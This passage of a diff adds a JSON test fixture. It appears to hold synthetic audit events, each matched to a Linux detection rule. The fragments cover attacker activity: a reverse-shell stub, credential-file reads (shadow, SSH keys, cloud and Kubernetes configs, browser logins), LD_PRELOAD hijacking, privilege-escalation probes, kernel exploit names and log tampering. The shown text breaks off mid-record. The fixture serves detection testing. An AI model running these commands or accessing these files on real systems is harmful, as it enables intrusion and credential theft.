@@ -1,0 +1,3940 @@
+[
+  {
+    "rule_id": "SATSUMA-BPF-CLI-001",
+    "event": {
+      "id": "audit-0",
+      "timestamp": 1793435794,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bpftool ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-002",
+    "event": {
+      "id": "audit-1",
+      "timestamp": 1793435794,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bpftool prog loadall ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-003",
+    "event": {
+      "id": "audit-2",
+      "timestamp": 1793435794,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bpftool map create ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-004",
+    "event": {
+      "id": "audit-3",
+      "timestamp": 1793435794,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bpftool prog detach ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-005",
+    "event": {
+      "id": "audit-4",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bpftrace kprobe:getdents",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-006",
+    "event": {
+      "id": "audit-5",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tc filter add bpf ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-BPF-CLI-007",
+    "event": {
+      "id": "audit-6",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ip link set xdp obj ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LINUX-CLI-001",
+    "event": {
+      "id": "audit-7",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "env LD_PRELOAD=x",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LINUX-CLI-002",
+    "event": {
+      "id": "audit-8",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cat /etc/ld.so.preload ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LINUX-CLI-003",
+    "event": {
+      "id": "audit-9",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tee /etc/ld.so.preload ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LINUX-CLI-004",
+    "event": {
+      "id": "audit-10",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find -exec /bin/sh ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-001",
+    "event": {
+      "id": "audit-11",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tar -czf /tmp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-002",
+    "event": {
+      "id": "audit-12",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "import -window",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-003",
+    "event": {
+      "id": "audit-13",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "logkeys",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-004",
+    "event": {
+      "id": "audit-14",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "xclip -o",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-005",
+    "event": {
+      "id": "audit-15",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "fixture/.thunderbird/fixture/ImapMail/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-006",
+    "event": {
+      "id": "audit-16",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "fixture/.mozilla/firefox/fixture/places.sqlite"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-007",
+    "event": {
+      "id": "audit-17",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "fixture/.mozilla/firefox/fixture/cookies.sqlite"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-008",
+    "event": {
+      "id": "audit-18",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.ssh/known_hosts"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-009",
+    "event": {
+      "id": "audit-19",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tar -czf ... *.db",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-010",
+    "event": {
+      "id": "audit-20",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tar -czf ... *.py",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-011",
+    "event": {
+      "id": "audit-21",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tar -czf /tmp/home",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-012",
+    "event": {
+      "id": "audit-22",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dd if=/dev/sd",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-013",
+    "event": {
+      "id": "audit-23",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cp /var/log/syslog",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-014",
+    "event": {
+      "id": "audit-24",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "mysqldump",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-015",
+    "event": {
+      "id": "audit-25",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "/etc/passwd"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-016",
+    "event": {
+      "id": "audit-26",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.ssh/id_rsa"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-017",
+    "event": {
+      "id": "audit-27",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.gnupg/secring.gpg"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-018",
+    "event": {
+      "id": "audit-28",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.kube/config"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-019",
+    "event": {
+      "id": "audit-29",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.aws/credentials"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-COLL-020",
+    "event": {
+      "id": "audit-30",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "~/.docker/config.json"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-C2-001",
+    "event": {
+      "id": "audit-31",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bash -i >& /dev/tcp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-C2-002",
+    "event": {
+      "id": "audit-32",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nc -lvnp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-C2-003",
+    "event": {
+      "id": "audit-33",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "iodine",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-C2-004",
+    "event": {
+      "id": "audit-34",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl -X POST",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-C2-005",
+    "event": {
+      "id": "audit-35",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ptunnel",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-001",
+    "event": {
+      "id": "audit-36",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "read",
+      "file_path": "/etc/shadow"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-002",
+    "event": {
+      "id": "audit-37",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "read",
+      "file_path": "/root/.ssh/id_rsa"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-003",
+    "event": {
+      "id": "audit-38",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "gcore",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-004",
+    "event": {
+      "id": "audit-39",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "fixture/.mozilla/firefox/fixture/logins.json"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-005",
+    "event": {
+      "id": "audit-40",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "/tmp/krb5cc_fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-006",
+    "event": {
+      "id": "audit-41",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "file_path": "/root/.gnupg/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-001",
+    "event": {
+      "id": "audit-42",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtypipe",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-002",
+    "event": {
+      "id": "audit-43",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtycow",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-003",
+    "event": {
+      "id": "audit-44",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2024-1086",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-004",
+    "event": {
+      "id": "audit-45",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2021-41073",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-005",
+    "event": {
+      "id": "audit-46",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2023-6931",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-006",
+    "event": {
+      "id": "audit-47",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2021-3493",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-007",
+    "event": {
+      "id": "audit-48",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rose_bind",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-008",
+    "event": {
+      "id": "audit-49",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2026-46331",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-009",
+    "event": {
+      "id": "audit-50",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2026-43503",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-KERNEL-010",
+    "event": {
+      "id": "audit-51",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtyfrag",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-POLKIT-001",
+    "event": {
+      "id": "audit-52",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "pkexec --user",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-001",
+    "event": {
+      "id": "audit-53",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudoedit -s",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-002",
+    "event": {
+      "id": "audit-54",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -R",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-003",
+    "event": {
+      "id": "audit-55",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudoedit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-004",
+    "event": {
+      "id": "audit-56",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -n",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-005",
+    "event": {
+      "id": "audit-57",
+      "timestamp": 1793435795,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/sudoers"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUID-001",
+    "event": {
+      "id": "audit-58",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -perm -4000",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUID-002",
+    "event": {
+      "id": "audit-59",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -perm -2000",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUID-003",
+    "event": {
+      "id": "audit-60",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "/bin/sh -p",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUID-004",
+    "event": {
+      "id": "audit-61",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "getcap -r",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CONT-001",
+    "event": {
+      "id": "audit-62",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "CVE-2025-31133",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CONT-002",
+    "event": {
+      "id": "audit-63",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "docker run --privileged",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CONT-003",
+    "event": {
+      "id": "audit-64",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nsenter",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EVAS-001",
+    "event": {
+      "id": "audit-65",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "chattr -i",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EVAS-002",
+    "event": {
+      "id": "audit-66",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nft flush ruleset",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EVAS-003",
+    "event": {
+      "id": "audit-67",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "systemctl stop auditd",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EVAS-004",
+    "event": {
+      "id": "audit-68",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "shred /var/log",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EVAS-005",
+    "event": {
+      "id": "audit-69",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "insmod",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-DISC-001",
+    "event": {
+      "id": "audit-70",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "linpeas.sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
